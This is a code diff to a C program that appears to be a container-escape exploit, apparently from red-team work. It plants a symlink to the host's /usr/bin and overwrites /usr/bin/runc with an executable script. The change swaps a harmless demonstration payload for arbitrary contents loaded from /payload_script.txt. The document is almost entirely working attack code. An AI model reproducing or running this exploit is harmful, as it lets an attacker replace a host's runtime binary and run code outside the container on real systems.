@@ -22,7 +22,39 @@ static const char *stage_link = "/watched/file.txt/.swap-escape";
 static const char *backup_dir = "/watched/file.txt/.old-escape";
 static const char *host_target_dir = "/usr/bin";
 static const char *host_target_file = "/usr/bin/runc";
+static const char *payload_script = "/payload_script.txt";
 static const int exit_quiet_ms = 250;
+
+static char *read_file_contents(const char *path)
+{
+    FILE *f = fopen(path, "r");
+    char *buf;
+    long len;
+
+    if (f == NULL) {
+        die(path);
+    }
+
+    // Get file size
+    fseek(f, 0, SEEK_END);
+    len = ftell(f);
+    fseek(f, 0, SEEK_SET);
+
+    // Allocate buffer
+    buf = malloc(len + 1);
+    if (buf == NULL) {
+        die("malloc");
+    }
+
+    // Read contents
+    if (fread(buf, 1, len, f) != (size_t)len) {
+        die("fread");
+    }
+
+    buf[len] = '\0';
+    fclose(f);
+    return buf;
+}
 
 static void die(const char *what)
 {
@@ -116,15 +148,17 @@ static void write_repeat_file(const char *path, char fill, size_t size)
 
 static void setup_layout(void)
 {
+    char *payload = read_file_contents(payload_script);
+
     mkdir_p(pivot_dir, 0755);
     mkdir_p(host_target_dir, 0755);
     write_text_file(backing_file, "top-level file\n");
     write_repeat_file(trigger_file, 'B', 16 * 1024 * 1024);
-    write_text_file(host_target_file, "#!/bin/bash\n echo 'you have been pwned';\ntouch /imperva_red_team;\n");
+    write_text_file(host_target_file, payload); 
+    free(payload);
     if (chmod(host_target_file, 0755) != 0) {
         die("chmod");
     }
-
     if (symlink(host_target_dir, stage_link) != 0) {
         die("symlink");
     }
